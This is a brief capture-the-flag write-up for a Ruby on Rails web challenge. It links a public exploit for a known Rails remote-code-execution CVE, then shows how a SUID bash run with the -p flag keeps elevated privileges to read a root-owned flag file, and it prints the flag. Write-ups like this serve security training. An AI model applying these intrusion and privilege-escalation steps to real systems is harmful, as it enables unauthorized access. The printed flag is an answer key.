# Web 03
Ruby on Rails challenge.
There's a known CVE that we use to gain shell (https://github.com/mpgn/Rails-doubletap-RCE).<br>

After getting a shell we see that the flag is owned by root.
The bash on system is has suid bit set that allows us to get root shell.
By default bash drops privileges unless explicitly asked not to.
```
bash-4.4$ /bin/bash -p 
/bin/bash -p 
bash-4.4$ id
id
uid=999(trex) gid=999(trex) euid=998(sauropod) egid=998(sauropod) groups=998(sauropod)
bash-4.4$ cat /flag.txt
cat /flag.txt
WhiteHat{do_not_push_secret_keys_in_rails}
bash-4.4$ 
```
## Flag
`WhiteHat{do_not_push_secret_keys_in_rails}`
